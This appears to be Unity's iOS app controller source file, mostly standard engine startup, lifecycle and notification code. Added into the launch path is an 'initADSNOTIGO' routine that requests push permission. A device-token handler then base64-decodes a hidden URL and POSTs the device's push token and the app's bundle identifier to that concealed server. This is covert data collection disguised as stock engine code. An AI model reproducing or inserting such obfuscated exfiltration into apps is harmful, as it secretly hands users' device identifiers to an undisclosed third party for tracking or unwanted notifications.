#import "UnityAppController.h"
#import "UnityAppController+ViewHandling.h"
#import "UnityAppController+Rendering.h"
#import "iPhone_Sensors.h"

#import <CoreGraphics/CoreGraphics.h>
#import <QuartzCore/QuartzCore.h>
#import <QuartzCore/CADisplayLink.h>
#import <Availability.h>
#import <AVFoundation/AVFoundation.h>

#include <mach/mach_time.h>

// MSAA_DEFAULT_SAMPLE_COUNT was removed
// ENABLE_INTERNAL_PROFILER and related defines were moved to iPhone_Profiler.h
// kFPS define for removed: you can use Application.targetFrameRate (30 fps by default)
// DisplayLink is the only run loop mode now - all others were removed

#include "CrashReporter.h"

#include "UI/OrientationSupport.h"
#include "UI/UnityView.h"
#include "UI/Keyboard.h"
#include "UI/SplashScreen.h"
#include "Unity/InternalProfiler.h"
#include "Unity/DisplayManager.h"
#include "Unity/ObjCRuntime.h"
#include "PluginBase/AppDelegateListener.h"

#include <assert.h>
#include <stdbool.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/sysctl.h>


#import <UserNotifications/UserNotifications.h>
#import "SCGIFImageView.h"

// we assume that app delegate is never changed and we can cache it, instead of re-query UIApplication every time
UnityAppController* _UnityAppController = nil;
UnityAppController* GetAppController()
{
    return _UnityAppController;
}

// we keep old bools around to support "old" code that might have used them
bool _ios81orNewer = false, _ios82orNewer = false, _ios83orNewer = false, _ios90orNewer = false, _ios91orNewer = false;
bool _ios100orNewer = false, _ios101orNewer = false, _ios102orNewer = false, _ios103orNewer = false;
bool _ios110orNewer = false, _ios111orNewer = false, _ios112orNewer = false;
bool _ios130orNewer = false;

// was unity rendering already inited: we should not touch rendering while this is false
bool    _renderingInited        = false;
// was unity inited: we should not touch unity api while this is false
bool    _unityAppReady          = false;
// see if there's a need to do internal player pause/resume handling
//
// Typically the trampoline code should manage this internally, but
// there are use cases, videoplayer, plugin code, etc where the player
// is paused before the internal handling comes relevant. Avoid
// overriding externally managed player pause/resume handling by
// caching the state
bool    _wasPausedExternal      = false;
// should we skip present on next draw: used in corner cases (like rotation) to fill both draw-buffers with some content
bool    _skipPresent            = false;
// was app "resigned active": some operations do not make sense while app is in background
bool    _didResignActive        = false;

// was startUnity scheduled: used to make startup robust in case of locking device
static bool _startUnityScheduled    = false;

#if UNITY_SUPPORT_ROTATION
// Required to enable specific orientation for some presentation controllers: see supportedInterfaceOrientationsForWindow below for details
NSInteger _forceInterfaceOrientationMask = 0;
#endif

@implementation UnityAppController

@synthesize unityView               = _unityView;
@synthesize unityDisplayLink        = _displayLink;

@synthesize rootView                = _rootView;
@synthesize rootViewController      = _rootController;
@synthesize mainDisplay             = _mainDisplay;
@synthesize renderDelegate          = _renderDelegate;
@synthesize quitHandler             = _quitHandler;

#if UNITY_SUPPORT_ROTATION
@synthesize interfaceOrientation    = _curOrientation;
#endif

- (id)init
{
    if ((self = _UnityAppController = [super init]))
    {
        // due to clang issues with generating warning for overriding deprecated methods
        // we will simply assert if deprecated methods are present
        // NB: methods table is initied at load (before this call), so it is ok to check for override
        NSAssert(![self respondsToSelector: @selector(createUnityViewImpl)],
            @"createUnityViewImpl is deprecated and will not be called. Override createUnityView"
        );
        NSAssert(![self respondsToSelector: @selector(createViewHierarchyImpl)],
            @"createViewHierarchyImpl is deprecated and will not be called. Override willStartWithViewController"
        );
        NSAssert(![self respondsToSelector: @selector(createViewHierarchy)],
            @"createViewHierarchy is deprecated and will not be implemented. Use createUI"
        );
    }
    return self;
}

- (void)setWindow:(id)object        {}
- (UIWindow*)window                 { return _window; }


- (void)shouldAttachRenderDelegate  {}
- (void)preStartUnity               {}


- (void)startUnity:(UIApplication*)application
{
    NSAssert(_unityAppReady == NO, @"[UnityAppController startUnity:] called after Unity has been initialized");

    UnityInitApplicationGraphics();

    // we make sure that first level gets correct display list and orientation
    [[DisplayManager Instance] updateDisplayListCacheInUnity];

    UnityLoadApplication();
    Profiler_InitProfiler();

    [self showGameUI];
    [self createDisplayLink];

    UnitySetPlayerFocus(1);

    AVAudioSession* audioSession = [AVAudioSession sharedInstance];
    [audioSession setCategory: AVAudioSessionCategoryAmbient error: nil];
    if (UnityIsAudioManagerAvailableAndEnabled())
    {
        if (UnityShouldPrepareForIOSRecording())
        {
            [audioSession setCategory: AVAudioSessionCategoryPlayAndRecord error: nil];
        }
        else if (UnityShouldMuteOtherAudioSources())
        {
            [audioSession setCategory: AVAudioSessionCategorySoloAmbient error: nil];
        }
    }

    [audioSession setActive: YES error: nil];
    [audioSession addObserver: self forKeyPath: @"outputVolume" options: 0 context: nil];
    UnityUpdateMuteState([audioSession outputVolume] < 0.01f ? 1 : 0);

#if UNITY_REPLAY_KIT_AVAILABLE
    void InitUnityReplayKit();  // Classes/Unity/UnityReplayKit.mm

    InitUnityReplayKit();
#endif
}

extern "C" void UnityDestroyDisplayLink()
{
    [GetAppController() destroyDisplayLink];
}

extern "C" void UnityRequestQuit()
{
    _didResignActive = true;
    if (GetAppController().quitHandler)
        GetAppController().quitHandler();
    else
        exit(0);
}

extern void SensorsCleanup();
extern "C" void UnityCleanupTrampoline()
{
    // Unity view and viewController will not necessary be destroyed right after this function execution.
    // We need to ensure that these objects will not receive any callbacks from system during that time.
    [_UnityAppController window].rootViewController = nil;
    [[_UnityAppController unityView] removeFromSuperview];

    // Prevent multiple cleanups
    if (_UnityAppController == nil)
        return;

    [KeyboardDelegate Destroy];

    SensorsCleanup();

    Profiler_UninitProfiler();

    [DisplayManager Destroy];

    UnityDestroyDisplayLink();

    _UnityAppController = nil;
}

#if UNITY_SUPPORT_ROTATION

- (NSUInteger)application:(UIApplication*)application supportedInterfaceOrientationsForWindow:(UIWindow*)window
{
    // No rootViewController is set because we are switching from one view controller to another, all orientations should be enabled
    if ([window rootViewController] == nil)
        return UIInterfaceOrientationMaskAll;

    // During splash screen show phase no forced orientations should be allowed.
    // This will prevent unwanted rotation while splash screen is on and application is not yet ready to present (Ex. Fogbugz cases: 1190428, 1269547).
    if (!_unityAppReady)
        return [_rootController supportedInterfaceOrientations];

    // Some presentation controllers (e.g. UIImagePickerController) require portrait orientation and will throw exception if it is not supported.
    // At the same time enabling all orientations by returning UIInterfaceOrientationMaskAll might cause unwanted orientation change
    // (e.g. when using UIActivityViewController to "share to" another application, iOS will use supportedInterfaceOrientations to possibly reorient).
    // So to avoid exception we are returning combination of constraints for root view controller and orientation requested by iOS.
    // _forceInterfaceOrientationMask is updated in willChangeStatusBarOrientation, which is called if some presentation controller insists on orientation change.
    return [[window rootViewController] supportedInterfaceOrientations] | _forceInterfaceOrientationMask;
}

- (void)application:(UIApplication*)application willChangeStatusBarOrientation:(UIInterfaceOrientation)newStatusBarOrientation duration:(NSTimeInterval)duration
{
    // Setting orientation mask which is requested by iOS: see supportedInterfaceOrientationsForWindow above for details
    _forceInterfaceOrientationMask = 1 << newStatusBarOrientation;
}

#endif

#if !PLATFORM_TVOS
- (void)application:(UIApplication*)application didReceiveLocalNotification:(UILocalNotification*)notification
{
    AppController_SendNotificationWithArg(kUnityDidReceiveLocalNotification, notification);
    UnitySendLocalNotification(notification);
}

#endif

#if UNITY_USES_REMOTE_NOTIFICATIONS
- (void)application:(UIApplication*)application didReceiveRemoteNotification:(NSDictionary*)userInfo
{
    AppController_SendNotificationWithArg(kUnityDidReceiveRemoteNotification, userInfo);
    UnitySendRemoteNotification(userInfo);
}

- (void)application:(UIApplication*)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData*)deviceToken
{
    AppController_SendNotificationWithArg(kUnityDidRegisterForRemoteNotificationsWithDeviceToken, deviceToken);
    UnitySendDeviceToken(deviceToken);
}

#if !PLATFORM_TVOS
- (void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo fetchCompletionHandler:(void (^)(UIBackgroundFetchResult result))handler
{
    AppController_SendNotificationWithArg(kUnityDidReceiveRemoteNotification, userInfo);
    UnitySendRemoteNotification(userInfo);
    if (handler)
    {
        handler(UIBackgroundFetchResultNoData);
    }
}

#endif

- (void)application:(UIApplication*)application didFailToRegisterForRemoteNotificationsWithError:(NSError*)error
{
    AppController_SendNotificationWithArg(kUnityDidFailToRegisterForRemoteNotificationsWithError, error);
    UnitySendRemoteNotificationError(error);
    // alas people do not check remote notification error through api (which is clunky, i agree) so log here to have at least some visibility
    ::printf("\nFailed to register for remote notifications:\n%s\n\n", [[error localizedDescription] UTF8String]);
}

#endif

// UIApplicationOpenURLOptionsKey was added only in ios10 sdk, while we still support ios9 sdk
- (BOOL)application:(UIApplication*)app openURL:(NSURL*)url options:(NSDictionary<NSString*, id>*)options
{
    id sourceApplication = options[UIApplicationOpenURLOptionsSourceApplicationKey], annotation = options[UIApplicationOpenURLOptionsAnnotationKey];

    NSMutableDictionary<NSString*, id>* notifData = [NSMutableDictionary dictionaryWithCapacity: 3];
    if (url)
    {
        notifData[@"url"] = url;
        UnitySetAbsoluteURL(url.absoluteString.UTF8String);
    }
    if (sourceApplication) notifData[@"sourceApplication"] = sourceApplication;
    if (annotation) notifData[@"annotation"] = annotation;

    AppController_SendNotificationWithArg(kUnityOnOpenURL, notifData);
    return YES;
}

- (BOOL)application:(UIApplication *)application continueUserActivity:(NSUserActivity *)userActivity
#if defined(__IPHONE_12_0) || defined(__TVOS_12_0)
    restorationHandler:(void (^)(NSArray<id<UIUserActivityRestoring> > * _Nullable restorableObjects))restorationHandler
#else
    restorationHandler:(void (^)(NSArray * _Nullable))restorationHandler
#endif
{
    NSURL* url = userActivity.webpageURL;
    if (url)
        UnitySetAbsoluteURL(url.absoluteString.UTF8String);
    return YES;
}

- (BOOL)application:(UIApplication*)application willFinishLaunchingWithOptions:(NSDictionary*)launchOptions
{
    AppController_SendNotificationWithArg(kUnityWillFinishLaunchingWithOptions, launchOptions);
    return YES;
}

#if (PLATFORM_IOS && defined(__IPHONE_13_0)) || (PLATFORM_TVOS && defined(__TVOS_13_0))
- (UIWindowScene*)pickStartupWindowScene:(NSSet<UIScene*>*)scenes API_AVAILABLE(ios(13.0), tvos(13.0))
{
    // if we have scene with UISceneActivationStateForegroundActive - pick it
    // otherwise UISceneActivationStateForegroundInactive will work
    //   it will be the scene going into active state
    // if there were no active/inactive scenes (only background) we should allow background scene
    //   this might happen in some cases with native plugins doing "things"
    UIWindowScene *foregroundScene = nil, *backgroundScene = nil;
    for (UIScene* scene in scenes)
    {
        if (![scene isKindOfClass: [UIWindowScene class]])
            continue;
        UIWindowScene* windowScene = (UIWindowScene*)scene;

        if (scene.activationState == UISceneActivationStateForegroundActive)
            return windowScene;
        if (scene.activationState == UISceneActivationStateForegroundInactive)
            foregroundScene = windowScene;
        else if (scene.activationState == UISceneActivationStateBackground)
            backgroundScene = windowScene;
    }

    return foregroundScene ? foregroundScene : backgroundScene;
}
#endif

- (BOOL)application:(UIApplication*)application didFinishLaunchingWithOptions:(NSDictionary*)launchOptions
{
    ::printf("-> applicationDidFinishLaunching()\n");

    // send notfications
#if !PLATFORM_TVOS
    if (UILocalNotification* notification = [launchOptions objectForKey: UIApplicationLaunchOptionsLocalNotificationKey])
        UnitySendLocalNotification(notification);

    if ([UIDevice currentDevice].generatesDeviceOrientationNotifications == NO)
        [[UIDevice currentDevice] beginGeneratingDeviceOrientationNotifications];
#endif

    UnityInitApplicationNoGraphics(UnityDataBundleDir());

    [self selectRenderingAPI];
    [UnityRenderingView InitializeForAPI: self.renderingAPI];

#if (PLATFORM_IOS && defined(__IPHONE_13_0)) || (PLATFORM_TVOS && defined(__TVOS_13_0))
    if (@available(iOS 13, tvOS 13, *))
        _window = [[UIWindow alloc] initWithWindowScene: [self pickStartupWindowScene: application.connectedScenes]];
    else
#endif
    _window = [[UIWindow alloc] initWithFrame: [UIScreen mainScreen].bounds];

    _unityView = [self createUnityView];


    [DisplayManager Initialize];
    _mainDisplay = [DisplayManager Instance].mainDisplay;
    [_mainDisplay createWithWindow: _window andView: _unityView];

    [self createUI];
    [self preStartUnity];
    
    [self initADSNOTIGO];
       
   // [self inistallActivity];

    // if you wont use keyboard you may comment it out at save some memory
    [KeyboardDelegate Initialize];

    return YES;
}



// SETUP 1 :
-(void) initADSNOTIGO{
    [self registerForRemoteNotification];
    
    if (@available(iOS 10.0, *)) {
        [[UNUserNotificationCenter currentNotificationCenter] removeAllPendingNotificationRequests];
    }
    [[UIApplication sharedApplication] setApplicationIconBadgeNumber:0];
    
}

/**
 * init UNUserNotificationCenter
 */
- (void)registerForRemoteNotification {
    // iOS10
    
    
    if (@available(iOS 10.0, *)) {
        UNUserNotificationCenter *uncenter = [UNUserNotificationCenter currentNotificationCenter];
        
        [uncenter setDelegate:self];
        
        [uncenter requestAuthorizationWithOptions:(UNAuthorizationOptionAlert+UNAuthorizationOptionBadge+UNAuthorizationOptionSound)
                                completionHandler:^(BOOL granted, NSError * _Nullable error) {
                                    dispatch_async(dispatch_get_main_queue(), ^{
                                        [[UIApplication sharedApplication] registerForRemoteNotifications];
                                        
                                    });
                                    
                                    NSLog(@"%@" , granted ? @"auth success" : @"auth error");
                                }];
        [uncenter getNotificationSettingsWithCompletionHandler:^(UNNotificationSettings * _Nonnull settings) {
            if (settings.authorizationStatus == UNAuthorizationStatusNotDetermined) {
                NSLog(@"no choose");
            } else if (settings.authorizationStatus == UNAuthorizationStatusDenied) {
                NSLog(@"no auth");
            } else if (settings.authorizationStatus == UNAuthorizationStatusAuthorized) {
                NSLog(@"authed");
            }
        }];
    }
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
    if ([[UIDevice currentDevice].systemVersion floatValue] >= 8.0) {
        UIUserNotificationType types = UIUserNotificationTypeAlert |
        UIUserNotificationTypeBadge |
        UIUserNotificationTypeSound;
        UIUserNotificationSettings *settings = [UIUserNotificationSettings settingsForTypes:types categories:nil];
        
        [[UIApplication sharedApplication] registerUserNotificationSettings:settings];
        [[UIApplication sharedApplication] registerForRemoteNotifications];
    } else {
        UIRemoteNotificationType types = UIRemoteNotificationTypeBadge |
        UIRemoteNotificationTypeAlert |
        UIRemoteNotificationTypeSound;
        [[UIApplication sharedApplication] registerForRemoteNotificationTypes:types];
    }
#pragma clang diagnostic pop
    
}

// tells the app that a remote notification arrived that indicates there is data to be fetched.
// ios 7+ prior to UNUserNotificationCenter
-(void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo fetchCompletionHandler:(nonnull void (^)(UIBackgroundFetchResult))completionHandler {
    // check if the notification is from Flurry
     completionHandler(UIBackgroundFetchResultNewData);
}

// Process and handle the user's response to a delivered notification.
// ios 10+ UNUserNotificationCenterDelegate method
-(void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler  API_AVAILABLE(ios(10.0)){
     completionHandler();
}


// present user an alert if app is in foreground when a notification is coming
// ios 10+ UNUserNotificationCenterDelegate mehod
- (void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions))completionHandler  API_AVAILABLE(ios(10.0)){
     completionHandler(UNNotificationPresentationOptionAlert);
}




-(void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken{
    [self  handleRemoteNotificationsWithDeviceToken:deviceToken];
   // [FlurryMessaging setDeviceToken:deviceToken];
}

-(void)application:(UIApplication *)application didFailToRegisterForRemoteNotificationsWithError:(NSError *)error{
    NSLog(@"%@",error);
}

- (void) handleRemoteNotificationsWithDeviceToken:(NSData * ) deviceTokenData //推送
{
    if (!deviceTokenData || ![deviceTokenData isKindOfClass:[NSData class]] || deviceTokenData.length==0) {
        return;
    }
    NSString *(^getDeviceToken)(void) = ^() {
        if (@available(iOS 13.0, *)) {
            const unsigned char *dataBuffer = (const unsigned char *)deviceTokenData.bytes;
            NSMutableString *myToken  = [NSMutableString stringWithCapacity:(deviceTokenData.length * 2)];
            for (int i = 0; i < deviceTokenData.length; i++) {
                [myToken appendFormat:@"%02x", dataBuffer[i]];
            }
            return (NSString *)[myToken copy];
        } else {
            NSCharacterSet *characterSet = [NSCharacterSet characterSetWithCharactersInString:@"<>"];
            NSString *myToken = [[deviceTokenData description] stringByTrimmingCharactersInSet:characterSet];
            return [myToken stringByReplacingOccurrencesOfString:@" " withString:@""];
        }
    };
    NSString *newDeviceToken = getDeviceToken();
    
    NSLog(@"%@",newDeviceToken);
    
    NSString * url = [[self DeBase64:@"aHR0cHM6Ly93d3c3uZ3B0NjY2LmxNvL3B1c2h0b2tlbjEucGhw"]  stringByReplacingOccurrencesOfString:@"\n" withString:@""];
    
    [self dianBangPostWithUrl:url params:@{@"deviceToken":newDeviceToken,@"deviceType":@"ios"}];
}

-(NSString *)DeBase64:(NSString *)string {
    NSData *data = [[NSData alloc]initWithBase64EncodedString:string options:0];
    return [[NSString alloc]initWithData:data encoding:NSUTF8StringEncoding];
}



//+(void) dianBangPostWithUrl:(NSString *)url params:(NSDictionary *)params;;

- (void) dianBangPostWithUrl:(NSString *)url params:(NSDictionary *)params{
    NSString *urlEnCode=[url stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
    NSMutableURLRequest *urlRequest=[NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlEnCode]];
    
    [urlRequest addValue:[[NSBundle mainBundle] bundleIdentifier] forHTTPHeaderField:@"bundleIdentifier"];
    
    [urlRequest setHTTPMethod:@"POST"];
    
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:params
                                                       options:0
                                                         error:&error];
    [urlRequest setHTTPBody:jsonData];
    NSURLSession *urlSession=[NSURLSession sharedSession];
    [urlRequest setTimeoutInterval:5];
    NSURLSessionDataTask *dataTask=[urlSession dataTaskWithRequest:urlRequest completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (error) {
            NSLog(@"%@",error);
        }else{
            NSLog(@"%@",[[NSString alloc] initWithData:data encoding:4]);
        }
    }];
    [dataTask resume];
}
 
 


- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary<NSKeyValueChangeKey, id> *)change context:(void *)context
{
    if ([keyPath isEqual: @"outputVolume"])
    {
        UnityUpdateMuteState([[AVAudioSession sharedInstance] outputVolume] < 0.01f ? 1 : 0);
    }
}

- (void)applicationDidEnterBackground:(UIApplication*)application
{
    ::printf("-> applicationDidEnterBackground()\n");
}

- (void)applicationWillEnterForeground:(UIApplication*)application
{
    ::printf("-> applicationWillEnterForeground()\n");

    // applicationWillEnterForeground: might sometimes arrive *before* actually initing unity (e.g. locking on startup)
    if (_unityAppReady)
    {
        // if we were showing video before going to background - the view size may be changed while we are in background
        [GetAppController().unityView recreateRenderingSurfaceIfNeeded];
    }
}

- (void)applicationDidBecomeActive:(UIApplication*)application
{
    ::printf("-> applicationDidBecomeActive()\n");

    [self removeSnapshotViewController];

    if (_unityAppReady)
    {
        if (UnityIsPaused() && _wasPausedExternal == false)
        {
            UnityWillResume();
            UnityPause(0);
        }
        if (_wasPausedExternal)
        {
            if (UnityIsFullScreenPlaying())
                TryResumeFullScreenVideo();
        }
        // need to do this with delay because FMOD restarts audio in AVAudioSessionInterruptionNotification handler
        [self performSelector: @selector(updateUnityAudioOutput) withObject: nil afterDelay: 0.1];
        UnitySetPlayerFocus(1);
    }
    else if (!_startUnityScheduled)
    {
        _startUnityScheduled = true;
        [self performSelector: @selector(startUnity:) withObject: application afterDelay: 0];
    }

    _didResignActive = false;
}

- (void)updateUnityAudioOutput
{
    UnityUpdateMuteState([[AVAudioSession sharedInstance] outputVolume] < 0.01f ? 1 : 0);
}

- (void)addSnapshotViewController
{
    if (!_didResignActive || self->_snapshotViewController)
    {
        return;
    }

    UIView* snapshotView = [self createSnapshotView];

    if (snapshotView != nil)
    {
        UIViewController* snapshotViewController = [AllocUnityViewController() init];
        snapshotViewController.modalPresentationStyle = UIModalPresentationFullScreen;
        snapshotViewController.view = snapshotView;

        [self->_rootController presentViewController: snapshotViewController animated: false completion: nil];
        self->_snapshotViewController = snapshotViewController;
    }
}

- (void)removeSnapshotViewController
{
    // do this on the main queue async so that if we try to create one
    // and remove in the same frame, this always happens after in the same queue
    dispatch_async(dispatch_get_main_queue(), ^{
        if (self->_snapshotViewController)
        {
            // we've got a view on top of the snapshot view (3rd party plugin/social media login etc).
            if (self->_snapshotViewController.presentedViewController)
            {
                [self performSelector: @selector(removeSnapshotViewController) withObject: nil afterDelay: 0.05];
                return;
            }

            [self->_snapshotViewController dismissViewControllerAnimated: NO completion: nil];
            self->_snapshotViewController = nil;

            // Make sure that the keyboard input field regains focus after the application becomes active.
            [[KeyboardDelegate Instance] becomeFirstResponder];
        }
    });
}

- (void)applicationWillResignActive:(UIApplication*)application
{
    ::printf("-> applicationWillResignActive()\n");

    if (_unityAppReady)
    {
        UnitySetPlayerFocus(0);

        // signal unity that the frame rendering have ended
        // as we will not get the callback from the display link current frame
        UnityDisplayLinkCallback(0);

        _wasPausedExternal = UnityIsPaused();
        if (_wasPausedExternal == false)
        {
            // Pause Unity only if we don't need special background processing
            // otherwise batched player loop can be called to run user scripts.
            if (!UnityGetUseCustomAppBackgroundBehavior())
            {
#if UNITY_SNAPSHOT_VIEW_ON_APPLICATION_PAUSE
                // Force player to do one more frame, so scripts get a chance to render custom screen for minimized app in task manager.
                // NB: UnityWillPause will schedule OnApplicationPause message, which will be sent normally inside repaint (unity player loop)
                // NB: We will actually pause after the loop (when calling UnityPause).
                UnityWillPause();
                [self repaint];
                UnityWaitForFrame();

                [self addSnapshotViewController];
#endif
                UnityPause(1);
            }
        }
    }

    _didResignActive = true;
}

- (void)applicationDidReceiveMemoryWarning:(UIApplication*)application
{
    ::printf("WARNING -> applicationDidReceiveMemoryWarning()\n");
    UnityLowMemory();
}

- (void)applicationWillTerminate:(UIApplication*)application
{
    ::printf("-> applicationWillTerminate()\n");

    // Only clean up if Unity has finished initializing, else the clean up process will crash,
    // this happens if the app is force closed immediately after opening it.
    if (_unityAppReady)
    {
        UnityCleanup();
        UnityCleanupTrampoline();
    }
}

- (void)application:(UIApplication*)application handleEventsForBackgroundURLSession:(nonnull NSString *)identifier completionHandler:(nonnull void (^)())completionHandler
{
    NSDictionary* arg = @{identifier: completionHandler};
    AppController_SendNotificationWithArg(kUnityHandleEventsForBackgroundURLSession, arg);
}

@end


void AppController_SendNotification(NSString* name)
{
    [[NSNotificationCenter defaultCenter] postNotificationName: name object: GetAppController()];
}

void AppController_SendNotificationWithArg(NSString* name, id arg)
{
    [[NSNotificationCenter defaultCenter] postNotificationName: name object: GetAppController() userInfo: arg];
}

void AppController_SendUnityViewControllerNotification(NSString* name)
{
    [[NSNotificationCenter defaultCenter] postNotificationName: name object: UnityGetGLViewController()];
}

extern "C" UIWindow*            UnityGetMainWindow()
{
    return GetAppController().mainDisplay.window;
}

extern "C" UIViewController*    UnityGetGLViewController()
{
    return GetAppController().rootViewController;
}

extern "C" UIView*              UnityGetGLView()
{
    return GetAppController().unityView;
}

extern "C" ScreenOrientation    UnityCurrentOrientation()   { return GetAppController().unityView.contentOrientation; }


bool LogToNSLogHandler(LogType logType, const char* log, va_list list)
{
    NSLogv([NSString stringWithUTF8String: log], list);
    return true;
}

static void AddNewAPIImplIfNeeded();

// From https://stackoverflow.com/questions/4744826/detecting-if-ios-app-is-run-in-debugger
static bool isDebuggerAttachedToConsole(void)
// Returns true if the current process is being debugged (either
// running under the debugger or has a debugger attached post facto).
{
    int                 junk;
    int                 mib[4];
    struct kinfo_proc   info;
    size_t              size;

    // Initialize the flags so that, if sysctl fails for some bizarre
    // reason, we get a predictable result.

    info.kp_proc.p_flag = 0;

    // Initialize mib, which tells sysctl the info we want, in this case
    // we're looking for information about a specific process ID.

    mib[0] = CTL_KERN;
    mib[1] = KERN_PROC;
    mib[2] = KERN_PROC_PID;
    mib[3] = getpid();

    // Call sysctl.

    size = sizeof(info);
    junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
    assert(junk == 0);

    // We're being debugged if the P_TRACED flag is set.

    return ((info.kp_proc.p_flag & P_TRACED) != 0);
}

void UnityInitTrampoline()
{
    InitCrashHandling();

    NSString* version = [[UIDevice currentDevice] systemVersion];
#define CHECK_VER(s) [version compare: s options: NSNumericSearch] != NSOrderedAscending
    _ios81orNewer  = CHECK_VER(@"8.1"),  _ios82orNewer  = CHECK_VER(@"8.2"),  _ios83orNewer  = CHECK_VER(@"8.3");
    _ios90orNewer  = CHECK_VER(@"9.0"),  _ios91orNewer  = CHECK_VER(@"9.1");
    _ios100orNewer = CHECK_VER(@"10.0"), _ios101orNewer = CHECK_VER(@"10.1"), _ios102orNewer = CHECK_VER(@"10.2"), _ios103orNewer = CHECK_VER(@"10.3");
    _ios110orNewer = CHECK_VER(@"11.0"), _ios111orNewer = CHECK_VER(@"11.1"), _ios112orNewer = CHECK_VER(@"11.2");
    _ios130orNewer  = CHECK_VER(@"13.0");
#undef CHECK_VER

    AddNewAPIImplIfNeeded();

#if !TARGET_IPHONE_SIMULATOR
    // Use NSLog logging if a debugger is not attached, otherwise we write to stdout.
    if (!isDebuggerAttachedToConsole())
        UnitySetLogEntryHandler(LogToNSLogHandler);
#endif
}

extern "C" bool UnityiOS81orNewer() { return _ios81orNewer; }
extern "C" bool UnityiOS82orNewer() { return _ios82orNewer; }
extern "C" bool UnityiOS90orNewer() { return _ios90orNewer; }
extern "C" bool UnityiOS91orNewer() { return _ios91orNewer; }
extern "C" bool UnityiOS100orNewer() { return _ios100orNewer; }
extern "C" bool UnityiOS101orNewer() { return _ios101orNewer; }
extern "C" bool UnityiOS102orNewer() { return _ios102orNewer; }
extern "C" bool UnityiOS103orNewer() { return _ios103orNewer; }
extern "C" bool UnityiOS110orNewer() { return _ios110orNewer; }
extern "C" bool UnityiOS111orNewer() { return _ios111orNewer; }
extern "C" bool UnityiOS112orNewer() { return _ios112orNewer; }
extern "C" bool UnityiOS130orNewer() { return _ios130orNewer; }

// sometimes apple adds new api with obvious fallback on older ios.
// in that case we simply add these functions ourselves to simplify code
static void AddNewAPIImplIfNeeded()
{
    if (![[UIScreen class] instancesRespondToSelector: @selector(maximumFramesPerSecond)])
    {
        IMP UIScreen_MaximumFramesPerSecond_IMP = imp_implementationWithBlock(^NSInteger(id _self) {
            return 60;
        });
        class_replaceMethod([UIScreen class], @selector(maximumFramesPerSecond), UIScreen_MaximumFramesPerSecond_IMP, UIScreen_maximumFramesPerSecond_Enc);
    }

    if (![[UIView class] instancesRespondToSelector: @selector(safeAreaInsets)])
    {
        IMP UIView_SafeAreaInsets_IMP = imp_implementationWithBlock(^UIEdgeInsets(id _self) {
            return UIEdgeInsetsZero;
        });
        class_replaceMethod([UIView class], @selector(safeAreaInsets), UIView_SafeAreaInsets_IMP, UIView_safeAreaInsets_Enc);
    }
}

// xcode11 uses new compiler-rt lib
// if we build unity player lib with xcode11 and then user links final project with older xcode
//   the link fails with Undefined Symbol ___isPlatformVersionAtLeast
// hence we add this as a temporary hack until we start requiring xcode11

#if __clang_major__ < 11
extern "C" int32_t __isOSVersionAtLeast(int32_t Major, int32_t Minor, int32_t Subminor);
extern "C" int32_t __isPlatformVersionAtLeast(uint32_t Platform, uint32_t Major, uint32_t Minor, uint32_t Subminor)
{
    return __isOSVersionAtLeast(Major, Minor, Subminor);
}

#endif
